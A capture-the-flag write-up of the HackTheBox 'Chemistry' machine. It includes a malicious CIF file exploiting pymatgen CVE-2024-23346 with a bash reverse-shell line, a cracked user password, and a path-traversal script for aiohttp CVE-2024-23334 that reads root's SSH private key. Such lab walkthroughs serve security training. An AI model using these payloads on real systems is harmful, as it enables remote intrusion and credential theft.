---
title: HackTheBox Chemistry Writeup
authors: Samarth
date: 2024-11-05 18:00:00 +0530
categories: [HackTheBox, Machines]
tags: [Linux, CVE-2024-23346, CVE-2024-23334, RCE, CIF Analyzer, aiohttp ]
math: true
mermaid: true
---

![Chemistry - HTB](/assets/images/writeups/Chemistry-HTB/banner.png)

## TL;DR

This writeup is based on the [__Chemistry__](https://app.hackthebox.com/machines/Chemistry){:target="_blank"} machine, which is an easy-rated Linux box on Hack The Box. I began by scanning the target and found open ports for SSH and an HTTP service running the Chemistry CIF Analyzer on port 5000. After enumerating the application, I registered an account and analyzed the CIF file structure. During research, I discovered that pymatgen, a library used in the analyzer, was vulnerable to **CVE-2024-23346**, allowing arbitrary code execution. By crafting a malicious CIF file, I gained a reverse shell as a low-privileged user. While exploring, I found a `database.db` file containing hashed credentials and cracked the password for the `rosa` user. Logging in via SSH, I discovered an internal **aiohttp** web service running on port 8080. Using **CVE-2024-23334**, a path traversal vulnerability, I retrieved the root user's SSH private key and used it to log in as root, ultimately capturing the root flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 22 and 5000, corresponding to SSH and Chemistry `Crystallographic Information File (CIF)` Analyzer. Here are the results from Nmap scan:

```bash
nmap -sC -sV -A -T4 10.10.11.38 -oN scan/normal.scan 
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-08 10:58 IST
Nmap scan report for 10.10.11.38
Host is up (0.22s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open     upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 08 Feb 2025 05:29:52 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 125.75 seconds
```

While analyzing Nmap output I have found that `Chemistry CIF Analyzer` is hosted on `Werkzeug/3.0.3` webserver and Werkzeug is a WSGI utility library used for building web applications in Python, often used with Flask. The application is running on `Python/3.9.5`.

## Enumeration

Chemistry CIF Analyzer is a flask application and by default it uses port `5000`. Let's browse on Chemistry CIF Analyzer.

![Chemistry CIF Analyzer](/assets/images/writeups/Chemistry-HTB/1.png)

A `Crystallographic Information File (CIF)` is a standard text-based format used to store and exchange crystallographic data, particularly crystal structures. It is widely used in X-ray crystallography, materials science, and chemistry to describe atomic positions, unit cell parameters, and other structural details of a crystal.

Let's register an account.

![Registering an user](/assets/images/writeups/Chemistry-HTB/2.png)

Once the user is registered, it will redirects to dashboard.

![Dashboard](/assets/images/writeups/Chemistry-HTB/3.png)

Dashboard provides a sample CIF file as well as an option to upload CIF file. Let's download the sample CIF file and analyze it.

![Content of sample CIF file](/assets/images/writeups/Chemistry-HTB/4.png)

Let's understand the file structure of `CIF` file.

### CIF File Structure 

A CIF file consists of structured text data following a key-value format. Here’s a breakdown of its common sections:

<b>1️⃣ Header (Metadata)</b> - Contains general information about the structure.

<b>2️⃣ Unit Cell Parameters</b> - Defines the size and shape of the crystal’s unit cell.

<b>3️⃣ Space Group Information</b> - Specifies the crystal symmetry.

<b>4️⃣ Atomic Positions</b> - Lists atomic coordinates in fractional units (relative to the unit cell).

<b>Sample CIF File Analysis</b>

1. Unit Cell Parameters:

    a. The unit cell has dimensions: 10 × 10 × 10 Å

    b. It is cubic because the angles are 90°.

2. Space Group:

    The space group is 'P 1', which is the most basic symmetry group (no symmetry   
constraints).

3. Atomic Positions:

    a. H (Hydrogen): Positioned at the origin (0.00000, 0.00000, 0.00000)

    b. O (Oxygen): Positioned at (0.50000, 0.50000, 0.50000)

    c. Both have an occupancy of 1, meaning they fully occupy their sites.

## Exploitation

After understanding `Crystallographic Information File (CIF)`, let's do some research for exploits against CIF file. I came across an exploit as [CVE-2024-23346 - Arbitrary Code Execution in pymatgen](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f){:target="_blank"}.

<b>CVE-2024-23346</b>

`CVE-2024-23346` is a critical security vulnerability exists in the `JonesFaithfulTransformation.from_transformation_str()` method within the pymatgen library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.

Let's use `_transformation_str()` method within the pymatgen library to create malicious payload to trigger reverse shell.

```bash
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/<ip>/4444 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Let's create malicious CIF file.

```bash
data_Exploit
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'

loop_
_atom_site_label
_atom_site_fract_x
_atom_site_fract_y
_atom_site_fract_z
_atom_site_occupancy
H 0.00000 0.00000 0.00000 1
O 0.50000 0.50000 0.50000 1

# Malicious payload triggering reverse shell via vulnerable pymatgen function
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/<ip>/4444 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Let's start netcat listener on the attacker machine and upload the malicious file on the dashboard to trigger reverse shell.

![Uploading malicious CIF file](/assets/images/writeups/Chemistry-HTB/5.png)

Let's check the netcat listener.

![Netcat listener](/assets/images/writeups/Chemistry-HTB/6.png)

While browsing directories, I found `instance` directory which consists of `database.db`.

Let's dump information of database.db.

![User's Information](/assets/images/writeups/Chemistry-HTB/7.png)


While browsing I found one directory named as `rosa` which is associated with user `rosa` so let's crack password to logged in as `rosa`.

![Password Cracking (MD5)](/assets/images/writeups/Chemistry-HTB/8.png)

I successfully cracked password of `rosa:unicorniosrosados`. Let's utilise the credentials to login using ssh.

![User Shell](/assets/images/writeups/Chemistry-HTB/9.png)

## Post Exploitation

I checked the current user's privileges using `sudo -l`, but `rosa` does not belong to the sudoers group.

![sudo -l](/assets/images/writeups/Chemistry-HTB/10.png)

Let's list all the processes running on the system using `ps aux`.

![ps aux](/assets/images/writeups/Chemistry-HTB/11.png)

While observing running processes I found unusual process running under root as `/usr/bin/python3.9 /opt/monitoring_site/app.py`.

Let's list all the active TCP connections and see on which port this application is running.

![netstat -tln](/assets/images/writeups/Chemistry-HTB/12.png)

This reveals that `port 8080` is open locally. It means that the `app.py` might be running as an internal application.

Let's do SSH port forwarding to access the application.

```bash
ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
```
Let's browse `http://127.0.0.1:8080`.

![Site Monitoring](/assets/images/writeups/Chemistry-HTB/13.png)

While browsing all web pages I couldn't able to find any information. Now, I will be running `whatweb` to find what technology is being used within the application.

![whatweb](/assets/images/writeups/Chemistry-HTB/14.png)

I have found `aiohttp/3.9.1` is being used to build async web servers. `aiohttp` is a Python library for making asynchronous HTTP requests and building async web servers. It is commonly used in web scraping, APIs, and async microservices.

`aiohttp` is running on it's outdated version as `3.9.1`. Let's search for vulnerability exists for this outdated version.

While researching I found [`CVE-2024-23334 - Path Traversal Vulnerability`](https://github.com/z3rObyte/CVE-2024-23334-PoC/tree/main){:target="_blank"} vulnerable to `aiohttp 3.9.1` version.

<b>CVE-2024-23334</b>

CVE-2024-23334 is a directory traversal vulnerability identified in the aiohttp library, an asynchronous HTTP client/server framework for Python's asyncio. This vulnerability allows unauthenticated remote attackers to access arbitrary files on the server, potentially leading to unauthorized data exposure. 

Let's use the below exploit.

```bash
#!/bin/bash

url="http://localhost:8080"
payload="/assets/"
file="root/.ssh/id_rsa"

for ((i=0; i<15; i++)); do
    payload+="../"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

While making changes in the actual script as `payload=/assets/` and `file=root/.ssh/id_rsa`.

![root's id_rsa](/assets/images/writeups/Chemistry-HTB/15.png)

Let's use `id_rsa` to login as a `root` user.

![root user login via id_rsa](/assets/images/writeups/Chemistry-HTB/16.png)

![Machine Pwned](/assets/images/writeups/Chemistry-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.